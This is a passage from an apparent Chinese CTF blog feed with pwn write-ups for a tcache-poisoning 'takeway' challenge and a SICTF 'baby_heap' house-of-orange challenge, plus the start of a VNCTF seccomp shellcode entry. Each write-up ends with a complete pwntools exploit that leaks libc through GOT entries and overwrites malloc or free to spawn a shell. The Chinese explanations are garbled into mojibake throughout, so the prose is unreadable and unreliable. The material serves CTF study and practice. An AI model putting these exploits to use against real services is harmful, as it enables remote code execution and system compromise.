---&gt; Â  &#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">payload = p64(<span class="number">0</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;name is: &#x27;</span>, payload)</span><br></pre></td></tr></table></figure></li>
<li>é€šè¿‡tcache poisoningåœ¨heapListæ®µä¼ªé€ chunk2ï¼Œ <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)                        <span class="comment"># æŠŠä¸Šä¸€æ­¥ç”³è¯·çš„chunk1æ”¾è¿›tcachebin</span></span><br><span class="line"><span class="comment"># gdb.attach(io)                 # é€šè¿‡binså‘½ä»¤å¯ä»¥çœ‹åˆ°ç°åœ¨æ˜¯tcachebin_entries[3] -&gt; chunk1 -&gt; chunk0</span></span><br><span class="line">payload = p64(heap_addr + <span class="number">0x290</span>) <span class="comment"># æ”¹ä¸ºtcachebin_entries[3] -&gt; chunk1 -&gt; (heap_addr + 0x290)</span></span><br><span class="line">fill(<span class="number">1</span>,payload)                  </span><br><span class="line">alloc(<span class="number">2</span>,payload1,payload2)       <span class="comment"># æŠŠchunk1ç”³è¯·å‡ºæ¥ï¼Œbinså˜ä¸ºtcachebin_entries[3] -&gt; (heap_addr + 0x290)</span></span><br></pre></td></tr></table></figure></li>
<li>ç”³è¯·chunk2ï¼ŒåŒæ—¶æŠŠputs_got-8å†™è¿›heapList[0]ï¼Œç„¶åé€šè¿‡modifyå‡½æ•°ä¸­çš„putsæ³„éœ²libcï¼ˆç¬”è¯¯:
ä¸‹å›¾â€œåŠ ä¸Šä¸‹ä¸€ä¸ªchunkçš„prev_sizeæ„æˆäº†chunk2â€ä¸­çš„"chunk2"åº”ä¸ºchunk3ï¼‰
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload1 = p64(puts_got-<span class="number">8</span>)</span><br><span class="line">alloc(<span class="number">3</span>,payload1,payload2)</span><br><span class="line">fill(<span class="number">3</span>,payload1)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;this order is: &#x27;</span>)</span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr Â  ---&gt; Â  &#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure> <img src="/pic/Pasted%20image%2020230827003153.png" />
è¯»è€…ä¹Ÿå¯ä»¥é€šè¿‡<code>x/20gx 0x404020</code>æ¥æŸ¥çœ‹Libcä¸­freeçš„ä¸‹ä¸€ä¸ªåœ°å€æ˜¯ä¸æ˜¯puts<br />
</li>
<li>ä¿®æ”¹"puts_got-8"æŒ‡å‘çš„åœ°å€ï¼Œå³free_libc_addrï¼Œæˆ‘ä»¬å°†å…¶ä¿®æ”¹ä¸ºsys_libc_addr
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr Â = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base Â  ---&gt; Â  &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr Â  Â ---&gt; Â  &#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line">payload1 = p64(sys_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;name is: &#x27;</span>, payload1)</span><br></pre></td></tr></table></figure></li>
<li>æ‰¾"ptræ²¡æœ‰è¢«ä¿®æ”¹"&amp;"chunkæ²¡æœ‰è¢«freeè¿‡"çš„chunk2å­˜ä¸€ä¸‹/bin/shç„¶åfreeæ‰ä»–ï¼Œgetshellï¼
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="x04-å®Œæ•´exp">0x04 å®Œæ•´EXP</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">domain_name = <span class="string">&#x27;101.200.234.115&#x27;</span></span><br><span class="line">port = <span class="number">42490</span></span><br><span class="line">file = <span class="string">&#x27;./takeway&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(domain_name,port)</span></span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./takeway&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">index,name,remark</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  io.sendafter(<span class="string">&#x27;name: &#x27;</span>, name)</span><br><span class="line">  io.sendafter(<span class="string">&#x27;remark: &#x27;</span>, remark)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index,name</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  io.sendafter(<span class="string">&#x27;name is: &#x27;</span>, name)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">payload1 = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload2 = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">alloc(<span class="number">0</span>,payload1,payload2)</span><br><span class="line">alloc(<span class="number">1</span>,payload1,payload2)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[-<span class="number">5</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">payload = p64(<span class="number">0</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;name is: &#x27;</span>, payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = p64(heap_addr + <span class="number">0x290</span>)</span><br><span class="line">fill(<span class="number">1</span>,payload)</span><br><span class="line">alloc(<span class="number">2</span>,payload1,payload2)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload1 = p64(puts_got-<span class="number">8</span>)</span><br><span class="line">alloc(<span class="number">3</span>,payload1,payload2)</span><br><span class="line">fill(<span class="number">3</span>,payload1)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;this order is: &#x27;</span>)</span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr  = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line">payload1 = p64(sys_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;name is: &#x27;</span>, payload1)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="x05-æ€»ç»“">0x05 æ€»ç»“</h1>
<p>è¿™é¢˜å¤ªé—æ†¾äº†...æœ€åä¹Ÿæ²¡åšå‡ºæ¥ã€‚ä¸è¿‡åšä¸€çªä¸é€šçš„é¢˜æ”¶è·æ‰æœ€å¤§ã€‚<br />
åšè¿™é“é¢˜ä¹‹å‰è¿˜ä»æ¥æ²¡æ¥è§¦è¿‡2.26ç‰ˆæœ¬ä»¥ä¸Šçš„å †é¢˜ï¼Œæ‰€ä»¥å¯¹tcachebinå®Œå…¨ä¸äº†è§£ã€‚<br />
å¯¹tcachebinçš„ç¬¬ä¸€å°è±¡å¦‚ä¸‹:<br />
1. æ¦‚è¿°<br />
1. 0x10~0x410ï¼ˆè²Œä¼¼æ˜¯ï¼‰çš„chunk 2. LIFO 3.
å¤§å°åªæœ‰7ï¼Œfreeæ»¡ä»¥åå†freeå°±ä¼šæ”¾åˆ°å¯¹åº”çš„å…¶ä»–binä¸­ 4.
2.28åŠä»¥ä¸‹çš„libcä¸æ£€æµ‹double free 2. ä¼ªé€ chunk 1.
å®‰å…¨æ€§æ¯”fastbinè¿˜å·®ï¼Œä¸æ£€éªŒfdæŒ‡å‘chunkçš„sizeç›´æ¥ç”³è¯· 3. leakå †åœ°å€ 1.
2.31åŠä»¥ä¸‹libcæ²¡æœ‰keyåŠ å¯†ï¼Œå¯ä»¥ç›´æ¥leakå‡ºå¯¹åº”å¤§å°çš„tcachebin_entry
ç›®å‰å°±æƒ³åˆ°è¿™äº›ï¼Œè¿™æ¬¡å¤šäºé˜Ÿå‹å¸¦é£ï¼Œè¿›åŠå†³èµ›äº†XD</p>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>Heap</tag>
        <tag>WriteUp - Reverse - Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2023SICTF-Pwn-baby_heap-wp</title>
    <url>/2023/09/22/comp%20-%202023SICTF-Pwn-baby_heap-wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
babyä¸€ç‚¹éƒ½ä¸baby...houseoforange+unsortedbinattack
</blockquote>
<span id="more"></span>
<h1 id="x00-é€†å‘åˆ†æ">0x00 é€†å‘åˆ†æ</h1>
<ol type="1">
<li>mainå‡½æ•°å¾ˆç®€å•ï¼Œ1ç”³è¯·2ç¼–è¾‘3æ‰“å°ï¼Œä½†æ˜¯æ²¡æœ‰freeï¼Œgoogle'no free
pwn'äº†è§£åˆ°æœ‰å¯èƒ½æ˜¯houseoforange</li>
<li>addå‡½æ•°ï¼Œä¸¤ä¸ªçº¦æŸï¼ˆ1. æœ€å¤šç”³è¯·32ä¸ªchunk 2.
chunkæœ€å¤§ä¸º0x1000ï¼‰ï¼Œè·Ÿè¿›chunk_sizeå’Œchunk_ptråå‘ç°ä¸¤è€…åœ¨bssæ®µæŒ¨å¾—å¾ˆè¿‘ï¼Œæ‰€ä»¥è¿™é‡Œå…¶å®å¯ä»¥ä¼ªé€ fake_chunkï¼Œåç»­å¯ä»¥è€ƒè™‘ç”¨fastbin
attackæˆ–è€…unsortedbin
attackæ¥æ‰“ï¼ˆä½†è¿™é‡Œæ²¡æœ‰freeï¼Œå°±å¯¼è‡´fastbinå¾ˆéš¾åˆ©ç”¨ï¼‰ <img
src="/pic/Pasted%20image%2020230922101040.png" /></li>
<li>editå‡½æ•° <img src="/pic/Pasted%20image%2020230922101820.png" /></li>
<li>showå‡½æ•°ï¼Œåªæ‰“å°äº†8ä¸ªå­—èŠ‚å°±å¾ˆéš¾å— <img
src="/pic/Pasted%20image%2020230922101901.png" /></li>
</ol>
<h1 id="x01-æ€è·¯åˆ†æ">0x01 æ€è·¯åˆ†æ</h1>
<ol type="1">
<li>æˆ‘ä»¬è‚¯å®šæ˜¯è¦å®ç°â€œleak libcâ€å’Œâ€œAny Address Writeâ€
<ol type="1">
<li>leak libc
<ol type="1">
<li>æ€è·¯1ï¼šunsortedbin leak
<ol type="1">
<li>ç†è®ºä¸Šå¯è¡Œï¼Œä½†ç”±äºshowåªæ‰“å°å…«ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥å¿…é¡»è¦æŠŠunsortedbiné‡Œçš„chunkç”³è¯·å‡ºæ¥å†æ‰“å°ï¼Œè¿™æ ·å°±ä¼šæµªè´¹ä¸€ä¸ªchunkï¼Œåç»­åˆ©ç”¨æ¯”è¾ƒéº»çƒ¦</li>
</ol></li>
<li>æ€è·¯2ï¼šåœ¨bssæ®µä¼ªé€ fake_chunkå†™å…¥gotè¡¨ï¼Œç›´æ¥writeå‡ºæ¥</li>
</ol></li>
<li>Any Address Write
<ol type="1">
<li>æ€è·¯1ï¼šå¸¸è§„unsortedbin attack
<ol type="1">
<li>æ¯”è¾ƒéº»çƒ¦ï¼Œæˆ‘çš„è¯„ä»·æ˜¯ä¸å¦‚unsortedbinç”³è¯·fake_chunk</li>
</ol></li>
<li>æ€è·¯2ï¼šunsortedbin ç”³è¯· fake_chunk
<ol type="1">
<li>å°†victim.bkè®¾ç½®ä¸ºfake_chunk_headï¼Œç”³è¯·ä¸¤æ¬¡å³å¯è·å¾—</li>
</ol></li>
</ol></li>
</ol></li>
<li>å°†å†™å…¥çš„gotè¡¨æ”¹å†™ä¸ºogå³å¯ææƒ</li>
</ol>
<h1 id="x02-å…·ä½“æ­¥éª¤">0x02 å…·ä½“æ­¥éª¤</h1>
<ol type="1">
<li>ç”±äºaddå‡½æ•°ä¸­ï¼Œchunk_sizeä¼šæˆªæ–­sizeï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³è¦ä¼ªé€ 0x111å¤§å°çš„chunkï¼ˆQ1ï¼‰çš„è¯ï¼Œå°±å¿…é¡»è¦ç”³è¯·ä¸€ä¸ª0x111ï¼Œä¸€ä¸ª0x1å¤§å°çš„chunkæ‰èƒ½æ­£ç¡®ä¼ªé€ sizeæ®µï¼Œè€Œç”³è¯·16ä¸ª0x100å¤§å°çš„chunkæ˜¯ä¸ºäº†æŠŠ0x4040c0-0x4040d0ç½®é›¶ï¼Œå³è«åå…¶å¦™çš„å…«ä¸ªå­—èŠ‚ï¼ˆQ2ï¼‰å’Œfake_chunkçš„prev_sizeæ®µ
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">Â  alloc(<span class="number">0x100</span>,payload) <span class="comment"># chunk0 - chunk15</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x111</span>,payload) Â  <span class="comment"># chunk16</span></span><br><span class="line">alloc(<span class="number">1</span>,payload) Â  Â  Â  <span class="comment"># chunk17</span></span><br></pre></td></tr></table></figure></li>
<li>houseofOrangeï¼Œæ­¤æ—¶unsortedbinä¸­ä¼šæœ‰ä¸€ä¸ªå¤§å°ä¸º0xdc0çš„chunkï¼Œè®°ä¸ºvictim
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0xdc1</span>)</span><br><span class="line">edit(<span class="number">17</span>, <span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x1000</span>,payload) <span class="comment">#18</span></span><br></pre></td></tr></table></figure></li>
<li>ä¼ªé€ victim.bk = 0x4040c8ï¼ˆfake_chunk_headï¼‰ <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + flat(<span class="number">0x111</span>,<span class="string">b&#x27;deadbeef&#x27;</span>,<span class="number">0x4040c8</span>)</span><br><span class="line">edit(<span class="number">17</span>, <span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure></li>
<li>è¿ç»­ç”³è¯·2ä¸ªchunkï¼Œåœ¨chunk_ptr[0]çš„ä½ç½®å†™å…¥malloc_gotï¼Œè°ƒç”¨showå‡½æ•°ä¸­çš„writeï¼Œå³å¯è·å¾—libc
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">alloc(<span class="number">0x100</span>,payload)</span><br><span class="line">malloc_got = elf.got[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(malloc_got)</span><br><span class="line">alloc(<span class="number">0x100</span>,payload)</span><br><span class="line">dump(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;libc_base Â  ---&gt; Â  <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li>è°ƒç”¨editå‡½æ•°ï¼Œåœ¨chunk_ptr[0]æŒ‡å‘çš„åœ°å€ï¼ˆå³mallocçš„libcåœ°å€ï¼‰å†™å…¥ogï¼Œè°ƒç”¨mallocå³å¯ææƒ
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;libc_base Â  ---&gt; Â  <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>)</span><br><span class="line">one_gadget = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">payload = p64(libc_base + one_gadget[<span class="number">3</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Size :&#x27;</span>, <span class="string">b&#x27;8&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="x03-ä¸€äº›é—®é¢˜">0x03 ä¸€äº›é—®é¢˜</h1>
<p>Q1ï¼š ä¸ºä»€ä¹ˆå¿…é¡»è¦ä¼ªé€ 0x111å¤§å°çš„chunkå‘¢ï¼Ÿ<br />
Q2ï¼š
æˆ‘æ„Ÿè§‰ç”³è¯·8ä¸ªchunkå°±å¤Ÿäº†...æŠŠfake_chunk_headä¿®æ”¹ä¸º0x4040c0ä¹Ÿä¸æ˜¯ä¸è¡Œå•Šï¼Ÿ</p>
<h1 id="x04-å®Œæ•´exp">0x04 å®Œæ•´EXP</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./baby_heap&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(domain_name,port)</span></span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./baby_heap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/mnt/e/EdgeDownload/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Size :&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Content :&#x27;</span>, content)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Size :&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  io.sendafter(<span class="string">&#x27;Content :&#x27;</span>, content)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="comment"># --------------------------------------------------------</span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">  alloc(<span class="number">0x100</span>,payload) <span class="comment"># chunk0 - chunk15</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x111</span>,payload)   <span class="comment"># chunk16</span></span><br><span class="line">alloc(<span class="number">1</span>,payload)       <span class="comment"># chunk17</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0xdc1</span>)</span><br><span class="line">edit(<span class="number">17</span>, <span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x1000</span>,payload) <span class="comment">#18</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + flat(<span class="number">0x111</span>,<span class="string">b&#x27;deadbeef&#x27;</span>,<span class="number">0x4040c8</span>)</span><br><span class="line">edit(<span class="number">17</span>, <span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">alloc(<span class="number">0x100</span>,payload)</span><br><span class="line">malloc_got = elf.got[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(malloc_got)</span><br><span class="line">alloc(<span class="number">0x100</span>,payload)</span><br><span class="line">dump(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;libc_base   ---&gt;   <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>)</span><br><span class="line">one_gadget = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">payload = p64(libc_base + one_gadget[<span class="number">3</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Size :&#x27;</span>, <span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>Heap</tag>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2024VNCTF_pwn_wp</title>
    <url>/2024/02/17/comp%20-%202024VNCTF_pwn_wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
æ²¡æ³¨æ„åˆ°ä»Šå¤©è¿˜æœ‰ä¸€ä¸ª vnctfğŸ˜­èµ›åå¤ç›˜ä¸€ä¸‹
</blockquote>
<span id="more"></span>
<h1 id="pwn">pwn</h1>
<h2 id="shellcode">shellcode</h2>
<p>ç­¾åˆ°é¢˜ï¼Œç¦ç”¨äº† execve ç›¸å…³å‡½æ•°ï¼Œè¿˜ç¦ç”¨äº†æ‰€æœ‰ä¸ read å’Œ socket send
ç›¸å…³çš„å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ ORW ç¼º R</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x11 0xc000003e  if (A != ARCH_X86_64) goto 0019</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x0e 0xffffffff  if (A != 0xffffffff) goto 0019</span><br><span class="line"> 0005: 0x15 0x0d 0x00 0x00000000  if (A == read) goto 0019</span><br><span class="line"> 0006: 0x15 0x0c 0x00 0x00000011  if (A == pread64) goto 0019</span><br><span class="line"> 0007: 0x15 0x0b 0x00 0x00000013  if (A == readv) goto 0019</span><br><span class="line"> 0008: 0x15 0x0a 0x00 0x00000028  if (A == sendfile) goto 0019</span><br><span class="line"> 0009: 0x15 0x09 0x00 0x0000002c  if (A == sendto) goto 0019</span><br><span class="line"> 0010: 0x15 0x08 0x00 0x0000002e  if (A == sendmsg) goto 0019</span><br><span class="line"> 0011: 0x15 0x07 0x00 0x0000003b  if (A == execve) goto 0019</span><br><span class="line"> 0012: 0x15 0x06 0x00 0x00000127  if (A == preadv) goto 0019</span><br><span class="line"> 0013: 0x15 0x05 0x00 0x00000142  if (A == execveat) goto 0019</span><br><span class="line"> 0014: 0x15 0x04 0x00 0x00000147  if (A == preadv2) goto 0019</span><br><span class="line"> 0015: 0x15 0x03 0x00 0x000001a9  if (A == 0x1a9) goto 0019</span><br><span class="line"> 0016: 0x15 0x02 0x00 0x000001aa  if (A == 0x1aa) goto 0019</span><br><span class="line"> 0017: 0x15 0x01 0x00 0x000001ab  if (A == 0x1ab) goto 0019</span><br><span class="line"> 0018: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0019: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯è¿™ç§ä¸æ˜¯<code>!=</code>çš„ seccomp ä»£è¡¨äº†æœ‰å¾ˆå¤šå…¶ä»–çš„å¯èƒ½æ€§ã€‚</p>
